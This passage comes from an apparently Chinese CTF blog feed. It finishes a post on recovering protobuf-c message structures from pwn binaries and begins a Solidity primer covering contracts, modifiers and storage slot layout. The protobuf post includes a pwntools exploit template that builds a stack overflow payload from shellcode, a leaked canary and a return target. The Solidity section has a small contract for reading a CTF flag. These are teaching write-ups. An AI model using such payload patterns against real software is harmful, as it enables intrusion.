<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/** A well-formed message must have exactly one of this field. */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A well-formed message can have zero or one of this field (but not</span></span><br><span class="line"><span class="comment">     * more than one).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field can be repeated any number of times (including zero) in a</span></span><br><span class="line"><span class="comment">     * well-formed message. The order of the repeated values will be</span></span><br><span class="line"><span class="comment">     * preserved.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This field has no label. This is valid only in proto3 and is</span></span><br><span class="line"><span class="comment">     * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT32,      <span class="comment">/**0&lt; int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**1&lt; signed int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**2&lt; signed int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT64,      <span class="comment">/**3&lt; int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**4&lt; signed int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**5&lt; signed int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**6&lt; unsigned int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**7&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**8&lt; unsigned int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**9&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**10&lt; float */</span></span><br><span class="line">    PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**11&lt; double */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**12&lt; boolean */</span></span><br><span class="line">    PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**13&lt; enumerated type */</span></span><br><span class="line">    PROTOBUF_C_TYPE_STRING,     <span class="comment">/**14&lt; UTF-8 or ASCII string */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**15&lt; arbitrary byte sequence */</span></span><br><span class="line">    PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**16&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure></div>
<h4 id="定位结构体方式">定位结构体方式</h4>
<h5 id="手动定位">1.手动定位</h5>
<p>因为我们输入的内容会通过<code>protobuf_c_message_unpack</code>这个函数进行解析。所以我们可以对比链接库中的函数具体定义以及我们pwn的主程序中调用的传参。然后就能跳转到主程序中的具体descriptor中进行下一步分析。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144416901.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144538997.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144611512.png"
                      class=""
                >
<p>首先要在主程序里找一个<code>message_descriptor</code>，一般在.data.rel.ro段，其开头的魔数(magic)是0x28AAEEF9，一般而言下面会直接解析出Protobuf结构体的名字，但也有IDA识别不出来的情况，我们可以手动将db类型转为dq类型，然后就会清晰很多。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026143624589.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144134084.png"
                      class=""
                >
<p>我们的消息结构体名字就为<code>MyMessage</code>。接着我们可以往<code>my_message__field_descriptors</code>里看，里面就是具体的字段，也就是<code>ProtobufCFieldDescriptor</code>这个结构体。但是也都被IDA当作了db解析，我们可以按照下表结构体的字段分布进行修改，手动将其解析一下，主要看name，id，label，type，其他怎么改影响不大。一下子就清晰了不少，然后我们就可以对照着枚举表还原出protobuf了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026151257848.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026144919768.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026150209780.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//message.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message MyMessage&#123;</span><br><span class="line">    optional <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">    required bytes buffer = <span class="number">3</span>;</span><br><span class="line">    required uint32 size = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后在命令行将其转化成python文件即可</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">protoc --python_out=. message.proto</span><br></pre></td></tr></table></figure></div>
<h5 id="自动分析">2.自动分析</h5>
<p>首先进入之前安装好的pbtk目录，<code>python3 gui.py</code>
就可以启动一个gui窗口，然后选择<code>Extract .proto structures from apps</code>，就可以选择pwn程序自动提取其中的proto文件了。但有时会不灵，还是手动分析有趣。</p>
<h4 id="脚本编写">脚本编写</h4>
<p>分析完proto的结构，就可以进行exp脚本的编写了，之前我们通过proto生成的python文件名为<code>proto结构体名_pb2</code>，可以先导入exp。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">......</span><br><span class="line">msg = message_pb2.MyMessage()		<span class="comment">#创建结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#各字段赋值</span></span><br><span class="line">msg.name = <span class="string">&#x27;Admin&#x27;</span></span><br><span class="line">msg.buffer = shellcode.ljust(<span class="number">0x208</span>,<span class="string">b&quot;a&quot;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(tar)</span><br><span class="line">msg.size = <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">payload = msg.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<h4 id="判别proto版本方式">判别proto版本方式</h4>
<p>一般proto分为proto2和proto3两个版本，在写proto文件时要在开头指明<code>syntax=proto2/3</code>。</p>
<p>在proto3中移除了require这个修饰符，如果有的label位为0（required），就说明用的是proto2语法。</p>
<p>其实也可以都带进去试试，总共就两个版本，别的地方没分析错的话总有一个会通过的。</p>
<h4 id="常见问题解决">常见问题解决</h4>
<h5 id="库找不到">1.库找不到</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026002833645.png"
                      class=""
                >
<p>可以手动在/usr/lib下添加一个链接</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /mnt/e/ctf/2024shctf/pwn/shctf——challage_pwn_protobuf/libprotobuf-c.so.1 /usr/lib/libprotobuf-c.so.1</span><br></pre></td></tr></table></figure></div>
<h5
id="运行exp时因为引入了proto转成的python文件报错">2.运行exp时因为引入了proto转成的python文件报错</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/image-20241026154314346.png"
                      class=""
                >
<p>提高python库中protobuf的版本</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 uninstall protobuf</span><br><span class="line">pip3 install protobuf==3.19.0</span><br></pre></td></tr></table></figure></div>
<h5
id="逆出结构体后prpto一直无法正常解析">3.逆出结构体后prpto一直无法正常解析</h5>
<p>可以尝试把<code>sendline</code>换成<code>send</code>，有时候多一个换行符就解析不出来了。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>protobuf</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity&amp;blockchain初探</title>
    <url>/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>solidity这个语言广泛运用与智能合约的编写，想要入门区块链就得先了解这个语言。该语言其实与c语言用法类似。在solidity语言中，标识执行账户是用地址实现的，比如我们MetaMask中创建的Account的地址或是某个合约的地址。</p>
<h3 id="一些基本概念与工具站">1.一些基本概念与工具站</h3>
<h4 id="账户">1）账户</h4>
<p><strong>外部账户</strong></p>
<p>外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。</p>
<p>一个外部账户具有以下特性</p>
<ul>
<li>拥有一定的 Ether</li>
<li>可以发送交易、通过私钥控制</li>
<li>没有相关联的代码</li>
</ul>
<p><strong>合约账户</strong></p>
<p>合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。</p>
<p>一个合约账户具有以下特性</p>
<ul>
<li>拥有一定的 Ether</li>
<li>有相关联的代码，代码通过交易或者其他合约发送的调用来激活</li>
<li>当合约被执行时，只能操作合约账户拥有的特定存储</li>
</ul>
<h4 id="合约">2）合约</h4>
<p>在区块链和智能合约的上下文中，合约通常是指一种程序或协议，能够在区块链上自动执行、控制或文档化法律事件和行动。以下是合约的一些关键特征：</p>
<ol type="1">
<li><strong>智能合约</strong>：智能合约是一种自执行的合约，其中协议的条款以代码形式写入，运行在区块链上。它们能够自动执行合约条款，减少对中介的依赖。</li>
<li><strong>去中心化</strong>：合约在区块链上运行，没有单一控制点，这使得合约更加透明和安全。</li>
<li><strong>不可篡改性</strong>：一旦合约部署到区块链上，其内容就无法更改，这提供了强有力的防篡改保障。</li>
<li><strong>透明性</strong>：合约的代码和执行是公开的，任何人都可以查看，从而提高了信任度。</li>
<li><strong>自动执行</strong>：合约可以根据预设条件自动执行，省去人工干预的需要。例如，当某个条件被满足时，合约会自动转移资产。</li>
<li><strong>多种用途</strong>：合约可以用于多种场景，如金融交易、身份验证、供应链管理、投票系统等。</li>
</ol>
<h4 id="常用网站及插件">3）常用网站及插件</h4>
<ul>
<li>MetaMask插件：可以创建属于自己的以太网账户，拥有一个地址，其相当于一个钱包，存着你不同网络中的以太币。</li>
<li><a class="link" 
 href="https://remix.ethereum.org/" >Remix<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：一个在线IDE，用于编辑合约以及与合约交互。</li>
<li><a class="link" 
 href="https://faucets.chain.link/" >Fauctes<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：水龙头，可以用来免费获取测试网络中免费的货币。</li>
<li><a class="link" 
 href="https://app.infura.io/" >infura<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：可以获取apikey，用于web3开发测试。</li>
</ul>
<h3 id="存储类型">2.<strong>存储类型</strong></h3>
<p>Solidity 主要有三种存储类型：</p>
<ul>
<li><strong>storage</strong>：永久存储，存储在区块链上，所有合约状态变量（如
<code>uint256 totalSupply;</code>）都是存储在这里。每次修改都会消耗
gas。</li>
<li><strong>memory</strong>：临时存储，存储在内存中，生命周期仅在当前调用期间。函数调用结束后，数据会被清除。适用于需要临时使用的数据，如函数内部的计算结果。</li>
<li><strong>calldata</strong>：用于函数参数的只读数据存储位置，数据存在于外部调用时的输入中，通常用于优化
gas 使用。</li>
</ul>
<h3 id="修饰符">3.修饰符</h3>
<h4 id="访问修饰符">1）<strong>访问修饰符</strong></h4>
<ul>
<li><strong><code>public</code></strong>：函数或变量可以被任何合约或外部账户访问。</li>
<li><strong><code>private</code></strong>：函数或变量只能在定义它的合约内部访问，其他合约无法访问。</li>
<li><strong><code>internal</code></strong>：函数或变量只能在当前合约及其子合约中访问，外部合约无法访问。</li>
<li><strong><code>external</code></strong>：函数只能被外部账户或其他合约调用，不能在合约内部调用。</li>
</ul>
<h4 id="状态修饰符">2）<strong>状态修饰符</strong></h4>
<ul>
<li><strong><code>view</code></strong>：函数不会修改区块链状态，且可以读取合约的状态变量。调用此函数不会消耗
gas。</li>
<li><strong><code>pure</code></strong>：函数不读取或修改任何状态变量，也不访问任何合约的状态。它只能使用传入的参数。调用此函数同样不会消耗
gas。</li>
<li><strong><code>payable</code></strong>：函数可以接收
ETH。用于处理涉及资金转移的功能。</li>
</ul>
<h4 id="其他常用修饰符">3）<strong>其他常用修饰符</strong></h4>
<ul>
<li><strong><code>require</code></strong>：用于验证条件是否为真，如果条件不满足，则抛出异常并撤销交易。常用于输入验证和权限检查。</li>
<li><strong><code>assert</code></strong>：用于检查不应发生的条件，如果条件不满足，则抛出异常并撤销交易。通常用于内部错误和不变性验证。</li>
<li><strong><code>revert</code></strong>：显式撤销交易，并可以返回错误消息。与
<code>require</code> 类似，但可以用于更复杂的条件检查。</li>
</ul>
<h4 id="自定义修饰符">4）自定义修饰符</h4>
<p>常见的是用于权限控制。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner &#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Not the contract owner&quot;);</span><br><span class="line">    _;			//_;用于替换实际的执行逻辑</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function restrictedFunction() public onlyOwner &#123;</span><br><span class="line">    // 只有合约的拥有者可以执行此函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="fallback-函数">5）<strong>Fallback 函数</strong></h4>
<p>特殊的函数，当合约接收到 ETH
但没有匹配的函数调用时会被执行。可以用于接收资金。</p>
<h3 id="常用内置函数以及全局变量">4.常用内置函数以及全局变量</h3>
<ul>
<li><code>abi.encodePacked</code> 是 Solidity
中的一个内置函数，用于将多个参数编码为一个字节数组。它在处理数据时非常有用，特别是在需要进行哈希计算、合约交互或其他数据处理时。</li>
<li><code>Keccak256</code>：
将输入数据（无论大小）转换为固定长度的输出（256 位），即 32
字节的哈希值。</li>
<li><code>msg.sender</code>：指向当前运行合约账户的地址</li>
<li><code>tx.origin</code>：存着整个调用链最原始的调用者的地址，及交易的原始发起方</li>
</ul>
<h3 id="从示例看基础语法">5.从示例看基础语法</h3>
<p>example：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// WelcomeSHCTF2024.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract WelcomeSHCTF2024 &#123;</span><br><span class="line"></span><br><span class="line">    string public storedFlag;</span><br><span class="line"></span><br><span class="line">    constructor(string memory flag) &#123;</span><br><span class="line">        string memory xorResult = xorWithSHCTF(flag);</span><br><span class="line">        storedFlag = xorResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory flagBytes = bytes(flag);</span><br><span class="line">        bytes memory xorKey = bytes(&quot;shctf&quot;);</span><br><span class="line">        bytes memory result = new bytes(flagBytes.length);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;</span><br><span class="line">            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return string(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyXORedFlag(string memory inputFlag) public view returns (bool) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(storedFlag)) == keccak256(abi.encodePacked(xorWithSHCTF(inputFlag)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>pragma solidity ^0.8.0;</code>：指明合约是用 Solidity
编写的，并且要求编译器版本为 0.8.0 或更高。</li>
<li><code>contract</code>：中文译为合约，类似与class，实际上就是声明一个对象。</li>
<li><code>string private storedFlag</code>：这个就很熟悉了，就是类型+访问修饰符+变量名的组合，声明一个变量</li>
<li><code>constructor(params)&#123;&#125;</code>：这个就是该合约的构造函数，在创建时会接受参数并初始化</li>
<li><code>function</code>：声明一个方法，参数可以带上修饰符，后面也可以跟上若干修饰符</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface IWelcomeSHCTF2024 &#123;</span><br><span class="line">    function verifyXORedFlag(string memory inputFlag) external view returns (bool);</span><br><span class="line">    function storedFlag() external view returns (string memory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    IWelcomeSHCTF2024 public tar;</span><br><span class="line"></span><br><span class="line">    constructor(address contractAddress) &#123;</span><br><span class="line">        // 使用给定的地址初始化合约实例</span><br><span class="line">        tar = IWelcomeSHCTF2024(contractAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function xorWithSHCTF(string memory flag) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory flagBytes = bytes(flag);</span><br><span class="line">        bytes memory xorKey = bytes(&quot;shctf&quot;);</span><br><span class="line">        bytes memory result = new bytes(flagBytes.length);</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; flagBytes.length; i++) &#123;</span><br><span class="line">            result[i] = bytes1(uint8(flagBytes[i]) ^ uint8(xorKey[i % xorKey.length]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return string(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getFlag() public view returns (string memory) &#123;</span><br><span class="line">        // 调用 WelcomeSHCTF2024 合约的 verifyXORedFlag 函数</span><br><span class="line">        return xorWithSHCTF(tar.storedFlag());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们也可以写一个与上述实例相交互的脚本，这里我们假设上面的storedFlag是个public变量，其中要先定义一个<code>interface</code>接口，里面要写这个接口中能被外部调用的方法，也就是有external或public修饰的方法，其具体定义可以直接复制源码中方法的定义。这样定义之后，我们就可以通过传入合约实例的地址，来创建这么一个接口实例，然后就能调用该实例对外公开的方法。要访问属性的话要通过getter方法，也就是多的一句<code>function storedFlag() external view returns (string memory);</code>来实现属性的接口调用。我们可以在本地做实验以验证。</p>
<h5 id="remix合约部署">remix合约部署</h5>
<p>可以先创建一个新的工作区，选择default
project就行。然后在contracts目录下新建自己合约文件，如<code>WelcomeSHCTF2024.sol</code>以及<code>exp.sol</code>，然后选择编译器版本后进行编译，之后转到<code>Deploy &amp; run transactions</code>界面。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161027491.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161608582.png"
                      class=""
                >
<p>在环境上选Remix
VM（与实际的测试网交互要选WalletConnect来连接到自己的账户），然后我们可以在deploy部署前输入一个flag字符串，作为该合约的constructor的参数。点击deploy进行合约的部署。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005161816606.png"
                      class=""
                >
<p>部署成功后底下Deployed
Contracts会显示出内容，我们可以通过点击按钮来调用各个接口，有些接口的调用我们需要传参。可以发现我们的public变量也可以作为接口调用，点击storedFlag就能获取到原合约异或加密后的storedFlag的值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162140584.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241005162816996.png"
                      class=""
                >
<p>然后我们复制一下这个自己部署的合约的地址，在编译完exp.sol后，在CONTRACT中选择exp.sol，传入刚才部署的合约地址用以接口调用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174515117.png"
                      class=""
                >
<p>成功以后，用我们之前编写的getFlag外部方法，就能直接获取到我们之前部署的flag了，这样能够获取到public存储的flag密文。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/10/08/solidity-blockchain%E5%88%9D%E6%8E%A2/image-20241007174257776.png"
                      class=""
                >
<h3 id="存储层面">6.存储层面</h3>
<p>这个感觉在ctf解题中是很重要的，感觉ctf-wiki中已经讲的很好了，这里我再整理一遍吧。</p>
<h4 id="插槽">插槽</h4>
<p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为
2^256 的超级数组中，数组中每个元素称为插槽，其初始值为
0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值)
数据才会被真正写入存储。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 插槽式数组存储</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # 每个插槽 32 字节</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure></div>
<p>当数据长度是已知时，其具体的存储位置将在编译时指定，而对于长度不确定的类型（如动态数组、映射），则会按一定规则计算存储位置。以下是对不同类型变量的储存模型的具体分析。</p>
<h4 id="存储规则">存储规则</h4>
<ul>
<li>存储插槽以低位对齐方式存储，在图上直观表示就是右对齐</li>
<li>每个基本类型只占存储它们所需字节</li>
<li>一个插槽内能存多个类型</li>
<li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽</li>
<li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）</li>
</ul>
<h5 id="一般存法">一般存法</h5>
<p>如以下合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address a;      // 0</span><br><span class="line">    uint8 b;        // 0</span><br><span class="line">    uint256 c;      // 1</span><br><span class="line">    bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<h5 id="动态数组存法">动态数组存法</h5>
<p>会占用对应位置 <code>p</code>
处的插槽，用以储存数组的长度，而数组真正的起始点会位于
<code>keccak256(p)</code> 处</p>
<p>如以下合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint256 a;      // 0</span><br><span class="line">    uint[] b;       // 1</span><br><span class="line">    uint256 c;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                      a (32)                       | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                    b.length (32)                  | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      c (32)                       | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b[0] (32)                    | &lt;- slot `keccak256(1)`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b[1] (32)                    | &lt;- slot `keccak256(1) + 1`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<h5 id="字节数组和字符串存法">字节数组和字符串存法</h5>
<p>如果 <code>bytes</code> 和 <code>string</code>
的数据很短，那么它们的长度也会和数据一起存储到同一个插槽。具体地说：如果数据长度小于等于
31 字节， 则它存储在高位字节（左对齐），最低位字节存储
<code>length * 2</code>。如果数据长度超出 31 字节，则在主插槽存储
<code>length * 2 + 1</code>， 数据照常存储在
<code>keccak256(slot)</code> 中。</p>
<h5 id="映射存法">映射存法</h5>
<p>对于映射，其会占据位置 <code>p</code>
处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code>
所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code>
是连接符。如果该值同时是一个非基本类型，则将
<code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p>
<p>如以下合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    mapping(address =&gt; uint) a;      // 0</span><br><span class="line">    uint256 b;                       // 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其存储布局如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">|                    reserved (a)                   | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                      b (32)                       | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                     a[addr] (32)                  | &lt;- slot `keccak256(addr . 0)`</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                        ...                        |   ......</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<h4 id="不同类型所占字节数">不同类型所占字节数</h4>
<p>X={8,16,24,32,40,48,56,64,128,256} N={x|1&lt;=x&lt;=16,x=32}</p>
<p>表中{x}代表X集合中某个元素，{n}表示N集合中某个元素，？？？为动态类型数据</p>
<table>
<thead>
<tr>
<th style="text-align: center;">类型</th>
<th style="text-align: center;">大小（字节）</th>
</tr>
</thead>
<tbody>
<tr>
